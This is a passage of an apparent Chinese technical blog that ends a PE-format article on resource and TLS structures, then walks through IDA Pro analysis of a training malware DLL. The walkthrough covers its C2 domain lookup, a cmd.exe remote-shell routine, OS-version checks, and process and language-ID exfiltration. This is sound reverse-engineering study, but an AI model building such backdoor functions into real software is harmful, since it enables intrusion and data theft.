<h3 id="资源目录"><a href="#资源目录" class="headerlink" title="资源目录"></a>资源目录</h3><p>资源是PE文件中最复杂的结构了，资源在PE文件中是以目录结构的形式存在的，一般情况下分为3层</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一层          资源类型的数量(资源类型)</span><br><span class="line">第二层          资源的数量（资源ID）</span><br><span class="line">第三层          资源数据的数量（资源代码页）</span><br></pre></td></tr></table></figure>

<p>​    </p>
<p>示意图：</p>
<p><img src="/2021/08/28/PE%E7%BB%93%E6%9E%84/image-20210903003255746.png" alt="image-20210903003255746"></p>
<h4 id="IMAGE-RESOURCE-DIRECTORY（资源目录结构）："><a href="#IMAGE-RESOURCE-DIRECTORY（资源目录结构）：" class="headerlink" title="IMAGE_RESOURCE_DIRECTORY（资源目录结构）："></a>IMAGE_RESOURCE_DIRECTORY（资源目录结构）：</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_RESOURCE_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;　　　　　　　　　　<span class="comment">//资源属性，通常为0</span></span><br><span class="line">    DWORD   TimeDateStamp;　　　　　　　　　　　<span class="comment">//时间戳</span></span><br><span class="line">    WORD    MajorVersion;　　　　　　　　　　　 <span class="comment">//资源大版本号</span></span><br><span class="line">    WORD    MinorVersion;　　　　　　　　　　　 <span class="comment">//资源小版本号</span></span><br><span class="line">    WORD    NumberOfNamedEntries;　　　　　　　<span class="comment">//按照名称命名的数量</span></span><br><span class="line">    WORD    NumberOfIdEntries;　　　　　　　　　<span class="comment">//按照ID命名的数量</span></span><br><span class="line"><span class="comment">//  IMAGE_RESOURCE_DIRECTORY_ENTRY DirectoryEntries[];</span></span><br><span class="line">&#125; IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;</span><br></pre></td></tr></table></figure>

<p>按照惯例，有用的就两个字段：</p>
<p>1.<strong>NumberOfNamedEntries</strong>（按照名称命名的数量）</p>
<p>意思就是我们的资源是字符串命名加载的有多少个</p>
<p>2.<strong>NumberOfIdEntries</strong>（按照ID命名的数量）</p>
<p>意思就是我们的资源如果按照ID有多少个，一般都是用ID的.</p>
<p>最后两个字段主要是资源的标识,是以ID的有多少个,以字符串标识的有多少个.</p>
<h4 id="IMAGE-RESOURCE-DIRECTORY-ENTRY（资源目录入口结构（子目录））"><a href="#IMAGE-RESOURCE-DIRECTORY-ENTRY（资源目录入口结构（子目录））" class="headerlink" title="IMAGE_RESOURCE_DIRECTORY_ENTRY（资源目录入口结构（子目录））"></a>IMAGE_RESOURCE_DIRECTORY_ENTRY（资源目录入口结构（子目录））</h4><p>这个结构是一个共用体，长度为8字节。</p>
<p>其中第一个DWORD大小,看高位,如果高位是1,那么低31位是指向新的目录项名称的结构体IMAGE_RESOURCE_DIR_STRING_U </p>
<p>如果高位为0,则是ID号,这个ID号说的是 资源ID类型,比如3类型指的就是ICON</p>
<p>第二个DWORD量,也是RVA偏移,如果高位为1,那么代表它还是一个目录,也就是指向了一个新的根目录了,这是个不断递归的过程.</p>
<p>如果不是,则指向文件偏移结构体了.</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_RESOURCE_DIRECTORY_ENTRY</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            DWORD NameOffset:<span class="number">31</span>;　　　　　　　<span class="comment">//位段: 低31位飘逝偏移 定义了目录项的名称或者ID</span></span><br><span class="line">            DWORD NameIsString:<span class="number">1</span>;　　　　　　<span class="comment">//位段: 高位, 如果这位为1,则表示31位的偏移指向的是一个Unicode字符串的指针偏移</span></span><br><span class="line">        &#125;;　　　　　　　　　　　　　　　　　　　　　　　</span><br><span class="line">      <span class="comment">//这里列出结构体,自己去看,IMAGE_RESOURCE_DIR_STRING_U 里面是字符串长度还有字符串,不是\0结尾　　　　　　　　　</span></span><br><span class="line">        DWORD   Name;　　　　　　　　　　　　　　　　　</span><br><span class="line">        WORD    Id;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   OffsetToData;　　　　　　　　　　　<span class="comment">//偏移RVA因为是联合体,所以有不同的解释</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            DWORD   OffsetToDirectory:<span class="number">31</span>;　　　　<span class="comment">//看高位,如果高位是1,那么RVA偏移指向的是新的(根目录)</span></span><br><span class="line">            DWORD   DataIsDirectory:<span class="number">1</span>;　　　　　　</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125; IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;</span><br></pre></td></tr></table></figure>



<h4 id="IMAGE-RESOURCE-DATA-ENTRY（资源数据入口）"><a href="#IMAGE-RESOURCE-DATA-ENTRY（资源数据入口）" class="headerlink" title="IMAGE_RESOURCE_DATA_ENTRY（资源数据入口）"></a>IMAGE_RESOURCE_DATA_ENTRY（资源数据入口）</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_RESOURCE_DATA_ENTRY</span> &#123;</span></span><br><span class="line">    DWORD   OffsetToData;				<span class="comment">//资源数据的RVA</span></span><br><span class="line">    DWORD   Size;						<span class="comment">//资源数据的长度</span></span><br><span class="line">    DWORD   CodePage;</span><br><span class="line">    DWORD   Reserved;</span><br><span class="line">&#125; IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;</span><br></pre></td></tr></table></figure>

<p> OffsetToData是指向资源数据的指针。</p>
<p>参考链接：</p>
<p><a href="https://www.cnblogs.com/iBinary/p/7712932.html">https://www.cnblogs.com/iBinary/p/7712932.html</a></p>
<h3 id="TLS表（Thread-local-storage，线程局部存储）："><a href="#TLS表（Thread-local-storage，线程局部存储）：" class="headerlink" title="TLS表（Thread local storage，线程局部存储）："></a>TLS表（Thread local storage，线程局部存储）：</h3><p>在研究TLS表之前，最好先了解Windows线程和进程之间的关系，这里不细说。所以这里的TLS也只是简单提一下。</p>
<p>TLS意思就是，每个线程都有自己的空间，局部存储。</p>
<p>作用：解决多线程程序设计中同步变量的问题。</p>
<p>实现TLS初始化有两种方式：</p>
<ul>
<li>动态线程局部存储技术</li>
<li>静态线程局部存储技术</li>
</ul>
<p>动态线程局部存储技术主要通过4个api函数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TlsAlloc( )：分配线程局部存储空间/索引，该进程任何线程都可以通过该索引来存储和检索线程中的值。</span><br><span class="line">TlsFree( ): 释放线程局部存储空间/索引。</span><br><span class="line">TlsGetValue( ): 获得线程局部存储空间里面的值，按索引取值。</span><br><span class="line">TlsSetValue( ): 设置线程局部存储空间的值，按索引存储。</span><br></pre></td></tr></table></figure>

<p>TLS结构表</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_TLS_DIRECTORY32</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DWORD   StartAddressOfRawData; 				<span class="comment">//　TLS初始化数据的起始地址</span></span><br><span class="line">    DWORD   EndAddressOfRawData;				<span class="comment">// TLS初始化数据的结束地址  两个正好定位一个范围,范围放初始化的值</span></span><br><span class="line">    PDWORD  AddressOfIndex;						<span class="comment">// TLS 索引的位置</span></span><br><span class="line">    PIMAGE_TLS_CALLBACK *AddressOfCallBacks;	<span class="comment">// Tls回调函数的数组指针</span></span><br><span class="line">    DWORD   SizeOfZeroFill;						<span class="comment">// 填充0的个数</span></span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">&#125; IMAGE_TLS_DIRECTORY32</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>很多实例没有分析，建议自行分析。</p>
]]></content>
      <categories>
        <category>二进制</category>
      </categories>
      <tags>
        <tag>二进制</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次IDA分析恶意DLL文件</title>
    <url>/2021/10/30/ida%E5%88%86%E6%9E%90dll/</url>
    <content><![CDATA[<p>本文首发于奇安信攻防社区，原文链接：<a href="https://forum.butian.net/share/809">https://forum.butian.net/share/809</a></p>
<span id="more"></span>

<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>本文主要是通过IDA对一个恶意dll样本进行分析，来熟悉IDA的基本操作，也可以了解到一些恶意样本的底层逻辑。</p>
<h3 id="0x01-Dllmain-的地址是什么？"><a href="#0x01-Dllmain-的地址是什么？" class="headerlink" title="0x01 Dllmain 的地址是什么？"></a>0x01 Dllmain 的地址是什么？</h3><p>BInary file: 二进制文件</p>
<p>选Binary file这个选项 是因为恶意代码有时候会带有shellcode、其他数据、加密参数，甚至在正常的PE文件中带有其他exe可执行文件，并且当包含这些附加数据的恶意代码在Windows上运行或者被加载到IDA 时，它不会被加载到内存中。因此，当加载一个包含shellcode的原始二进制文件时，应当将这个文件作为二进制文件加载并且反汇编。</p>
<p>但是这里切记刚开始就选portable 模式，不要选Binary FIle，我刚开始就选的Binary File，怎么也找不到入口点，具体原因还未知……<img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211015133537658.png" alt="image-20211015133537658"></p>
<p>就像下面一样</p>
<img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211015131534620.png" alt="image-20211015131534620">



<img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211015133446713.png" alt="image-20211015133446713">



<p>跳转到 <code>1000D02E</code>处，这里 开始执行汇编指令的地方才是 dllmain 函数的入口点，虽然前面这个地址也有很多行，但都是注释，并没有实际含义。</p>
<img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211016100029604.png" alt="image-20211016100029604">



<p>切忌分析前面的那一段，因为所有从 <code>DllEntryPoint</code> 到 <code>Dllmain</code> 之间执行的代码一般是由编译器生成的。</p>
<h3 id="0x02-使用imports窗口并浏览到-gethostbyname，导入函数定位到什么地址？"><a href="#0x02-使用imports窗口并浏览到-gethostbyname，导入函数定位到什么地址？" class="headerlink" title="0x02 使用imports窗口并浏览到 gethostbyname，导入函数定位到什么地址？"></a>0x02 使用imports窗口并浏览到 gethostbyname，导入函数定位到什么地址？</h3><p>首先定位下这个函数，</p>
<img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211016100845892.png" alt="image-20211016100845892">



<p>最终定位的地址就是 <code>idata</code> 区段的 <code>100163CC</code> 处</p>
<img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211016100917422.png" alt="image-20211016100917422">



<h3 id="0x03-有多少函数调用了gethostbyname"><a href="#0x03-有多少函数调用了gethostbyname" class="headerlink" title="0x03 有多少函数调用了gethostbyname"></a>0x03 有多少函数调用了gethostbyname</h3><p>右键该函数名， <code>Jump to xref to operated</code> </p>
<img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211016101846526.png" alt="image-20211016101846526">



<img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211016102747030.png" alt="image-20211016102747030">



<p><code>Type</code> 中的 <code>r</code> 是 read，读取的意思，函数首先要被cpu读取，才能够被调用， <code>Type</code>中的<code>p</code>是被调用的引用</p>
<p>这里就是5个函数一共调用了9次<code>gethostbyname</code>函数</p>
<h3 id="0x04-将精力集中在位于-0x10001757-处的对-gethostbyname的调用，你能找出哪个DNS请求将被触发吗？"><a href="#0x04-将精力集中在位于-0x10001757-处的对-gethostbyname的调用，你能找出哪个DNS请求将被触发吗？" class="headerlink" title="0x04 将精力集中在位于 0x10001757 处的对 gethostbyname的调用，你能找出哪个DNS请求将被触发吗？"></a>0x04 将精力集中在位于 <code>0x10001757</code> 处的对 <code>gethostbyname</code>的调用，你能找出哪个DNS请求将被触发吗？</h3><p>首先 g 跳转到 <code>0x10001757</code> 这个地址</p>
<img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211016105841737.png" alt="image-20211016105841737">



<p>简单分析下这段汇编</p>
<p>首先， 将 <code>off_10019040</code> 赋值给 <code>eax</code> 寄存器，接着 地址位 + 0Dh(转换为10进制就是13)，就是将地址往后偏移 13 位，然后<code>push</code> 入栈，接着 <code>call</code> 调用 <code>gethostbyname</code> 参数。</p>
<p>大概流程是这样，要找 被触发的dns请求，就一个个分析地址吧。先拿<code>10019040</code> 开刀，</p>
<img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211016111139289.png" alt="image-20211016111139289">



<p>找到了一串字符串，跳转到这里看一看，找到完整的字符串 <code>pics.praticalmalwareanalysis.com</code></p>
<img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211016111223853.png" alt="image-20211016111223853">

<p>所以，<code>off_10019040</code> 是一个字符串指针，指向字符串的 <code>[This is RDO]pics.praticalmalwareanalysis.com</code> 的第一个字符，然后<code>add 0Dh</code> 后，偏移13位，指向字符p，最后 <code>push</code>入栈的值是 <code>pics.praticalmalwareanalysis.com</code></p>
<h3 id="0x05-IDA-pro-识别了在-0x10001656-处的子过程中的多少个局部变量？"><a href="#0x05-IDA-pro-识别了在-0x10001656-处的子过程中的多少个局部变量？" class="headerlink" title="0x05 IDA pro 识别了在 0x10001656 处的子过程中的多少个局部变量？"></a>0x05 IDA pro 识别了在 <code>0x10001656</code> 处的子过程中的多少个局部变量？</h3><p>还是先跳转到这里，</p>
<img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211016112449612.png" alt="image-20211016112449612">



<p>数一数，一共24个局部变量。</p>
<img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211016112549484.png" alt="image-20211016112549484">



<h3 id="0x06-IDA-Pro-识别了在-0x10001656-处的子过程中的多少参数？"><a href="#0x06-IDA-Pro-识别了在-0x10001656-处的子过程中的多少参数？" class="headerlink" title="0x06 IDA Pro 识别了在 0x10001656 处的子过程中的多少参数？"></a>0x06 IDA Pro 识别了在 <code>0x10001656</code> 处的子过程中的多少参数？</h3><p>首先搞清楚参数的定义： 参数是调用这个函数的函数传递给被调用函数的值</p>
<p>很明显，这里只传入了一个 <code>LPVOID</code>类型的参数 <code>lpThreadParameter</code></p>
<img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211016114127422.png" alt="image-20211016114127422">



<h3 id="0x07-使用string窗口，来在反汇编中定位字符串-cmd-exe-c。它位于哪？"><a href="#0x07-使用string窗口，来在反汇编中定位字符串-cmd-exe-c。它位于哪？" class="headerlink" title="0x07 使用string窗口，来在反汇编中定位字符串\cmd.exe /c。它位于哪？"></a>0x07 使用string窗口，来在反汇编中定位字符串\cmd.exe /c。它位于哪？</h3><p>string 窗口： <code>shift+f12</code></p>
<img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211016114608893.png" alt="image-20211016114608893">

<p>定位 cmd.exe 的地址</p>
<img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211016114646468.png" alt="image-20211016114646468">

<img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211016114708879.png" alt="image-20211016114708879">

<p>定位到地址： <code>xdoors_d:10095834</code>处</p>
<h3 id="0x08-在引用-cmd-exe-c-的代码所在的区域发生了什么？"><a href="#0x08-在引用-cmd-exe-c-的代码所在的区域发生了什么？" class="headerlink" title="0x08 在引用 \cmd.exe /c 的代码所在的区域发生了什么？"></a>0x08 在引用 <code>\cmd.exe /c</code> 的代码所在的区域发生了什么？</h3><p>首先查找 <code>cmd.exe</code> 的引用源，</p>
<p>右键</p>
<img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211016115942699.png" alt="image-20211016115942699">

<img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211016115958950.png" alt="image-20211016115958950">



<p>下面就分析下这段汇编</p>
<img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211016120034950.png" alt="image-20211016120034950">

<p>首先第一眼看到的是将 <code>\\cmd.exe /c</code> 字符串 <code>push</code> 入栈， </p>
<p>点击字符串，跳转</p>
<img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211016122237140.png" alt="image-20211016122237140">

<p>看到这些字符串， <code>Hi… Welcome… Machine Uptime… Machine IdleTime…Encrype Magic… Remote Shell Session…</code></p>
<p>大概也能猜到这是一个获取机器信息的远程shell会话</p>
<p>定位一下字符串的地址，看到还有 <code>language /robotwork /mbase /mhost</code>等等，获取的都是一些系统信息</p>
<img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211016123356166.png" alt="image-20211016123356166">

<img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211016123432861.png" alt="image-20211016123432861">

<img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211016123516965.png" alt="image-20211016123516965">



<h3 id="0x09-在同样的区域，在0x100101c8处，看起来好像dword-1008E5C4是一个全局变量，它帮助决定走哪条路径。那恶意代码是如何设置dword-1008E5C4的呢？（提示：使用dword-1008E5C4的交叉引用。）"><a href="#0x09-在同样的区域，在0x100101c8处，看起来好像dword-1008E5C4是一个全局变量，它帮助决定走哪条路径。那恶意代码是如何设置dword-1008E5C4的呢？（提示：使用dword-1008E5C4的交叉引用。）" class="headerlink" title="0x09 在同样的区域，在0x100101c8处，看起来好像dword_1008E5C4是一个全局变量，它帮助决定走哪条路径。那恶意代码是如何设置dword_1008E5C4的呢？（提示：使用dword_1008E5C4的交叉引用。）"></a>0x09 在同样的区域，在0x100101c8处，看起来好像dword_1008E5C4是一个全局变量，它帮助决定走哪条路径。那恶意代码是如何设置dword_1008E5C4的呢？（提示：使用dword_1008E5C4的交叉引用。）</h3><p>老惯例，先跳，</p>
<img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211016123850968.png" alt="image-20211016123850968">

<p>接着右键查看下交叉引用,或者 <code>ctrl + x</code></p>
<p>3个指令，两个 <code>cmp</code>, 只有第一个 <code>mov</code> 指令改变了该地址值</p>
<img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211016123935860.png" alt="image-20211016123935860">



<p>跳：</p>
<img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211016124439180.png" alt="image-20211016124439180">

<p>来看一下这条指令的前后都做了些什么。</p>
<p>在<code>mov</code>之前 <code>call sub_10003695</code>   ,那就先看这个函数地址到底返回了什么东西。</p>
<img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211016152924271.png" alt="image-20211016152924271">

<p>先根据几个字符串猜测一下吧，<code>VersionInformation/ dwOsVersionInfoSize/ Getversion/ dwPlatformId </code> 首先猜测跟操作系统的版本信息有关。</p>
<p>比较关键的几步操作就是： </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor eax eax:	将eax清零，此前eax中存放的是 GetVersionExA 的返回值	</span><br><span class="line"></span><br><span class="line">cmp:			将 ebp+VersionInformation.dwPlatformId 的值与2进行比较（VER_PLATFORM_WIN32_NT等于2的话，代表的系统为Windows 7, Windows Server 2008, Windows Vista, Windows Server 2003, Windows XP, or Windows 2000）</span><br><span class="line"></span><br><span class="line">setz  al:		当ZF标志被设定时，AL寄存器设为1</span><br></pre></td></tr></table></figure>

<p>刚刚我们 <code>cmp</code>了两个数，所以如果两个数相同，ZF=1，然后setz，AL被设置为1，反之不相同的话，AL被设置为0(AL是 <code>eax</code>的低8位，对应的AH是<code>eax</code>的高8位)，一般来说执行上面命令的都是这几种机器，所以一般情况下 AL 会被设置为1，接着<code>ret</code>返回<code>eax</code>的值。</p>
<p>所以<code>ret eax</code>最后的结果通常会被设置为1,即 <code>sub_10003694</code>的返回值是1，接着<code>mov dword_1008E5C4, eax</code>,最后<code>dword_1008E5C4</code>全局变量的值也是1。</p>
<h3 id="0x0A-在位于0x1000FF58处的子过程中的几百行指令中，一系列使用memcmp来比较字符串的比较。如果对robotword的字符串比较是成功的（当memcmp返回0），会发生什么？"><a href="#0x0A-在位于0x1000FF58处的子过程中的几百行指令中，一系列使用memcmp来比较字符串的比较。如果对robotword的字符串比较是成功的（当memcmp返回0），会发生什么？" class="headerlink" title="0x0A 在位于0x1000FF58处的子过程中的几百行指令中，一系列使用memcmp来比较字符串的比较。如果对robotword的字符串比较是成功的（当memcmp返回0），会发生什么？"></a>0x0A 在位于0x1000FF58处的子过程中的几百行指令中，一系列使用memcmp来比较字符串的比较。如果对robotword的字符串比较是成功的（当memcmp返回0），会发生什么？</h3><p><code>0x1000FF58</code>处的远程shell函数从<code>0x1000FF58</code>开始包含一系列<code>memcmp</code>函数</p>
<p>跳：</p>
<img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211016160830165.png" alt="image-20211016160830165">

<p>往下找 <code>memcpy</code> 函数，看到前面 <code>aQuit 和 eax</code> 被 <code>push</code>入栈，所以这里<code>memcpy</code>这两个值</p>
<img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211016161822937.png" alt="image-20211016161822937">



<p>接下来找<code>robotwork</code>,</p>
<img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211016162717540.png" alt="image-20211016162717540">

<p>如果<code>eax</code>和 <code>robotwork</code>相同，返回0，<code>0Ch</code>是<code>12d</code>，也是<code>4(字节)*3(个)</code>，因为<code>push</code>后面跟的是立即数，所以一个数占<code>4</code>字节，然后<code>offset</code>也是<code>4</code>个字节，所以，一开始的<code>push 9</code>，和后面的两次<code>push</code>，加起来一共是3次，所以这里回收了这3个一共12字节的空间</p>
<p><code>test eax,eax</code>  按位与操作，接着如果 <code>eax</code>为0，则<code>ZF</code>置为<code>1</code>，<code>JnZ</code>跳转，<code>eax</code>为<code>0</code>说明前面的<code>memcmp</code>比较的结果是相同，也就是如果前面两个数相同，则<code>JZ</code>跳转，<code>JNZ</code>不跳转</p>
<p><code>push [ebp+s]</code>: 栈中，<code>esp</code>是栈顶指针，<code>ebp</code>是栈基址，<code>esp</code>地址减小，栈空间增大；<code>ebp</code>增加，<code>ebp</code>将向栈底偏移 。所以这里是将<code>ebp</code>向下s的指针地址压栈.</p>
<p>然后<code>call sub_100052A2</code>， 来看下这个地址。</p>
<img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211016171726054.png" alt="image-20211016171726054">



<p>看样子是进行socket通信的函数，</p>
<p>仔细看下这个函数的代码，可以看到它获取了注册表的一些信息。</p>
<img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211016172714890.png" alt="image-20211016172714890">



<img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211016173136985.png" alt="image-20211016173136985">



<p>书上说应该是这两个键值：</p>
<p><code>SOFTWARE\Microsoft\Windows\CurrentVersion\WorkTime</code></p>
<p><code>SOFTWARE\Microsoft\Windows\CurrentVersion\WorkTimes</code></p>
<p>我在我的计算机上去对应的注册表目录找，并没有找到这两个键值，猜测可能是以前的Windows版本</p>
<h3 id="0x0B-PSLIST导出函数做了什么？"><a href="#0x0B-PSLIST导出函数做了什么？" class="headerlink" title="0x0B  PSLIST导出函数做了什么？"></a>0x0B  PSLIST导出函数做了什么？</h3><p>打开导出表</p>
<img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211016173912607.png" alt="image-20211016173912607">

<p>可以看到这个函数有两条执行路径，判断的条件是由<code>sub_100036C3</code>决定的</p>
<img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211016174334431.png" alt="image-20211016174334431">

<p>来看下 <code>sub_100036C3</code>函数</p>
<img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211016174743509.png" alt="image-20211016174743509" style="zoom:;">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call    ds:GetVersionExA ; 调用函数查看系统版本</span><br><span class="line">cmp     [ebp+VersionInformation.dwPlatformId], 2 ; 这个我们上面说过，如果等于2，是那些windows版本</span><br><span class="line">                                                 ; 包括`Windows 7, Windows Server 2008, Windows Vista, Windows Server 2003, Windows XP, or Windows 2000`</span><br><span class="line">jnz     short loc_100036FA ; 如果不想等，则跳转结束</span><br><span class="line">cmp     [ebp+VersionInformation.dwMajorVersion], 5 ; 5代表特殊版本的windows</span><br><span class="line">jb      short loc_100036FA ; 无符号比较，如果[ebp+VersionInformation.dwMajorVersion]小于5跳转</span><br><span class="line">push    1</span><br><span class="line">pop     eax</span><br><span class="line">leave                   ; High Level Procedure Exit</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>

<p>其中，<code>cmp   [ebp+VersionInformation.dwMajorVersion], 5 </code> 中的5是下面的5</p>
<p><img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211016175043943.png" alt="image-20211016175043943"></p>
<p>如果是过低的版本，就直接跳转结束，如果是符合要求的版本，则返回 1</p>
<p>然后就是比较跳转，如果<code>eax</code>为<code>0</code>，<code>test</code>之后，<code>ZF</code>为<code>1</code>，然后<code>JZ</code>跳转</p>
<p><img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211016183846582.png" alt="image-20211016183846582"></p>
<p>如果<code>eax</code>不为<code>0</code>，<code>ZF</code>不为<code>0</code>，然后<code>JZ</code>不跳转，也就是如果版本符合要求，就不跳转（跳转之后是直接结束），<code>ZF</code> 置为0</p>
<p>如果是不跳转的话，push了一个字符串进去，然后调用<code>strlen</code>返回字符串的长度在<code>eax</code>中，然后<code>test eax, eax</code></p>
<p>如果<code>eax</code>为0<code>ZF</code>置为1，<code>JNZ</code>不跳转<br>反之如果不为<code>0</code>，<code>JNZ</code>跳转</p>
<p><img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211016184326470.png" alt="image-20211016184326470"></p>
<p>假设<code>eax</code>为0，<code>JNZ</code>不跳转，我们走一下这条线</p>
<p><code>call sub_10006518 </code></p>
<p>可以看到这个地址调用的一个函数 <code>CreateToolhelp32Snapshot</code></p>
<p><code>CreateToolhelp32Snapshot函数为指定的进程、进程使用的堆[HEAP]、模块[MODULE]、线程[THREAD]）建立一个快照[snapshot]。</code></p>
<p>简单来说这个函数用来获取进程列表。通过<code>send</code> 将进程列表通过 <code>socket</code> 发送。但是我没有找到 <code>send</code> 函数………..</p>
<p><img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211016184715151.png" alt="image-20211016184715151"></p>
<h3 id="0x0C-使用图模式来绘制出对sub-10004E79的交叉引用图。当进入这个函数时，哪个API函数可能被调用？仅仅基于这些API函数，你会如何重命名这个函数？"><a href="#0x0C-使用图模式来绘制出对sub-10004E79的交叉引用图。当进入这个函数时，哪个API函数可能被调用？仅仅基于这些API函数，你会如何重命名这个函数？" class="headerlink" title="0x0C 使用图模式来绘制出对sub_10004E79的交叉引用图。当进入这个函数时，哪个API函数可能被调用？仅仅基于这些API函数，你会如何重命名这个函数？"></a>0x0C 使用图模式来绘制出对sub_10004E79的交叉引用图。当进入这个函数时，哪个API函数可能被调用？仅仅基于这些API函数，你会如何重命名这个函数？</h3><p>首先跳： <code>sub_10004E79</code></p>
<p><img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211017103401333.png" alt="image-20211017103401333"></p>
<p>使用图模式绘制交叉引用图</p>
<p><img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211017103550428.png" alt="image-20211017103550428"></p>
<p><img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211017103602010.png" alt="image-20211017103602010"></p>
<p>默认选项，可以看到交叉引用图</p>
<p><img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211017103635493.png" alt="image-20211017103635493"></p>
<p>可以看出<code>sub_10004E79</code>函数调用的有<code>GetSystemDefaultLangID</code>、<code>sprintf</code>、<code>sub_100038EE</code>、<code>strlen</code>，而<code>sub_100038EE</code>调用了<code>send</code>、<code>malloc</code>、<code>free</code>、<code>__imp_strlen</code>，然后<code>GetSystemDefaultLangID</code>是获取系统的默认语言的函数，<code>send</code>是通过<code>socket</code>发送信息的函数。因此可以右键函数名，重命名为 <code>send_languageId</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps: 这种快速分析是一种获得对二进制文件高层次视图的好方法，在分析二进制文件时非常有用</span><br></pre></td></tr></table></figure>



<h3 id="0x0D-DllMain直接调用了多少个Windows-API？多少个在深度为2的时候被调用"><a href="#0x0D-DllMain直接调用了多少个Windows-API？多少个在深度为2的时候被调用" class="headerlink" title="0x0D DllMain直接调用了多少个Windows API？多少个在深度为2的时候被调用?"></a>0x0D DllMain直接调用了多少个Windows API？多少个在深度为2的时候被调用?</h3><p>有两种思路：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.逐一查看Dllmain函数的代码，在代码中看api调用</span><br><span class="line">2.利用交叉引用图</span><br></pre></td></tr></table></figure>

<p>先定位到 <code>Dllmain</code>的位置</p>
<p><img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211017104627152.png" alt="image-20211017104627152"></p>
<p>像前文一样，打开交叉引用图</p>
<p>默认配置后会…一言难尽……</p>
<p><img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211017104803555.png" alt="image-20211017104803555"></p>
<p>这里修改下<code>Recursion depth(递归深度)</code>，改为1</p>
<p><img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211017105328465.png" alt="image-20211017105328465"></p>
